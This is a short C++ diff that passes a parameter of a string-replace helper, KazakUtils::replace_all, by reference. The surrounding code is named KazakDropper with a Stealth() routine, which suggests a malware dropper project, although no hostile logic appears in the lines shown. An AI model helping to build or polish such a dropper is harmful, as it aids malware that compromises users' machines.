@@ -66,7 +66,7 @@ void KazakDropper::Stealth()
 	std::this_thread::sleep_for(std::chrono::seconds(5));
 }
 
-std::string KazakUtils::replace_all(std::string subject, const std::string& search, const std::string& replace)
+std::string KazakUtils::replace_all(std::string& subject, const std::string& search, const std::string& replace)
 {
 	size_t pos = 0;
 	while ((pos = subject.find(search, pos)) != std::string::npos)
